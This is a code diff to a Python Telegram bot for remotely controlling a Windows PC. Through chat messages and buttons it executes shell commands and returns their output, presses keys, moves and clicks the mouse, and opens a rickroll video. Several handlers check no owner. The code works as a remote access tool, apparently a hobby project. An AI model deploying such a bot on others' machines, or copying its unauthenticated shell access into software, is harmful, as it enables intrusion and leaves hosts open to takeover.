@@ -1,29 +1,143 @@
 import subprocess
-from pyrogram import Client, filters
 import pyautogui
 import io
 import sys
-import platform,socket,re,uuid,json,psutil,logging
-from win10toast import ToastNotifier
-from pyrogram import Client, filters
-from PIL import ImageGrab
-import webbrowser
-from pyrogram.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+import platform
+import socket
+import re
+import uuid
+import json
+import psutil
+import logging
 import random
 import os
-from pyrogram import *
 import requests
-app = Client("my_idiot")
+import webbrowser
+from pyrogram import Client, filters
+from PIL import ImageGrab, Image
+from io import BytesIO
+from win10toast import ToastNotifier
+import mouse
+from pyrogram.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 toaster = ToastNotifier()
+app = Client("my_idiot")
+global OWNER_ID
+OWNER_ID = 1829043559
+# Load the list of owners from a file
+with open("owners.json", "r") as f:
+    owners = json.load(f)
+@app.on_message(filters.command(["delowner"]))
+async def del_owner(client, message):
+    id = message.from_user.id
+    global owners
+    text = message.text.split()
+    global OWNER_ID
+    if id == OWNER_ID:
+        if len(text) == 1:
+            # If the user didn't provide any arguments, send a message asking for them
+            await message.reply("Please provide the ID or mention of the user you want to remove as owner.")
+        else:
+            # Get the user ID from the message text
+            user_id = text[1]
+            if not user_id.isdigit():
+                # If the provided argument is not a number, try to extract the user ID from a mention
+                user_id = message.entities[1].user.id
+            user_id = int(user_id)
+            # If user_id is None, the provided argument is invalid
+            if user_id is None:
+                await message.reply("Invalid user ID or mention.")
+            else:
+                # Remove the user from the owners list
+                if user_id in owners:
+                    owners.remove(user_id)
+                    with open("owners.json", "w") as f:
+                        json.dump(owners, f)
+                    await message.reply(f"User {user_id} removed from owners list.")
+                else:
+                    await message.reply(f"User {user_id} is not an owner.")
+
+
+# Define a filter to check if a user is an owner
+def is_owner(message):
+    return message.from_user.id in owners
+
+@app.on_message(filters.command("addowner"))
+def add_owner(client, message):
+ if is_owner(message):
+    user_id = None
+    if message.reply_to_message:
+        user_id = message.reply_to_message.from_user.id
+    elif len(message.command) == 2:
+        try:
+            user_id = int(message.command[1])
+        except ValueError:
+            pass
+
+    if user_id:
+        if user_id not in owners:
+            owners.append(user_id)
+            with open("owners.json", "w") as f:
+                json.dump(owners, f)
+            message.reply(f"{user_id} has been added as an owner.")
+        else:
+            message.reply(f"{user_id} is already an owner.")
+    else:
+        message.reply("Please reply to a message from the user you want to add as an owner or provide a valid user ID.")
+
+@app.on_message(filters.command("help"))
+async def help_command(client, message):
+    # Get a list of all the registered commands
+    commands = await client.list_commands()
+
+    # Create a string that lists all the available commands
+    help_text = "Available commands:\n\n"
+    for command in commands:
+        help_text += f"/{command.command} - {command.description}\n"
+
+    await message.reply(help_text)
+
+@app.on_message(filters.command("restart"))
+def restart(client, message):
+ if is_owner(message):
+    message.reply("Restarting...")
+    os.execl(sys.executable, sys.executable, *sys.argv)
+ else:
+     message.reply("Нет прав для рестарта!!!")
+@app.on_message(filters.command("bw"))
+async def black_and_white_filter(client: Client, message: Message):
+    # Check if the message contains a photo or a video
+    if message.photo or message.video:
+        # Download the media file
+        file = await message.download()
+
+        # Open the media file with Pillow
+        with Image.open(file) as img:
+            # Apply the black and white filter
+            img = img.convert("L")
+
+            # Save the modified image to memory
+            with BytesIO() as buffer:
+                img.save(buffer, format="PNG")
+                buffer.seek(0)
+
+                # Send the modified image back to the user
+                await message.reply_photo(buffer)
+
+        # Delete the downloaded file from disk
+        os.remove(file)
+    else:
+        # If the message doesn't contain a photo or a video, let the user know
+        await message.reply("Please send a photo or a video.")
 @ app.on_message(filters.command("press"))
 def press_key(client, message):
     keys = message.text.split()[1:]
     pyautogui.hotkey(*keys)
 # eg /press q u a x  a l e r t
 @app.on_message(filters.command(['rickroll']))
-def press_key(client, message):
+def press_rick(client, message):
     browser = webbrowser.get()
     browser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    message.reply("Rickrolled OMG OMG OMG")
 def get_ip():
     response = requests.get('https://api64.ipify.org?format=json').json()
     return response["ip"]
@@ -130,6 +244,44 @@ def media_command_handler(client, message):
         reply_markup=volume_control_markup
     )
 
+# Handler function for the media command
+@app.on_message(filters.command("cursor"))
+def media_command_handler(client, message):
+    # Define the inline keyboard markup with the volume control buttons
+    cursor_control_markup = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("ЛКМ", callback_data="click"),
+            InlineKeyboardButton("⬅", callback_data="left"),
+            InlineKeyboardButton("⬆", callback_data="up"),
+            InlineKeyboardButton("➡", callback_data="right"),
+            InlineKeyboardButton("⬇", callback_data="down")
+        ]
+    ])
+
+    # Send the volume control buttons with a message
+    client.send_message(
+        message.chat.id,
+        "Cursor position:",
+        reply_markup=cursor_control_markup
+    )
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "left"))
+def r(client, callback_query):
+    mouse.move(-450, 0, absolute=False, duration=0)
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "right"))
+def _handler(client, callback_query):
+    mouse.move(450, 0, absolute=False, duration=0)
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "up"))
+def allback_handler(client, callback_query):
+    mouse.move(0, -450, absolute=False, duration=0)
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "down"))
+def decrease_handler(client, callback_query):
+    mouse.move(0, 450, absolute=False, duration=0)
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "click"))
+def decrease_vandler(client, callback_query):
+    mouse.click()
 
 # Handler functions for the volume control buttons
 # Handler functions for the volume control buttons
@@ -170,6 +322,10 @@ def increase_volume_callback_handler(client, callback_query):
     client.answer_callback_query(callback_query.id, "Volume increased by 10.")
 
 
+@app.on_message(filters.command("click"))
+def uh(client, message):
+    mouse.click()
+
 @app.on_message(filters.command("volume"))
 def volume_command_handler(client, message):
     # Parse the volume level from the command arguments
@@ -188,14 +344,17 @@ def volume_command_handler(client, message):
 def run_command(client, message):
     command = message.text
     try:
+
         msg = client.send_message(message.chat.id, "Running command...")
         output = subprocess.check_output(command, shell=True)
         if len(output) > 4096:
             output = output[:4093] + b""
+        if "/addowner" in message.text:
+            print(0)
         if "shutdown" in command:
             print(msg)
             client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text="Чмо блять")
-        else:
+        else :
             print(msg)
             client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=f"probably success \n {output.decode('cp866')}")
     except subprocess.CalledProcessError as e:
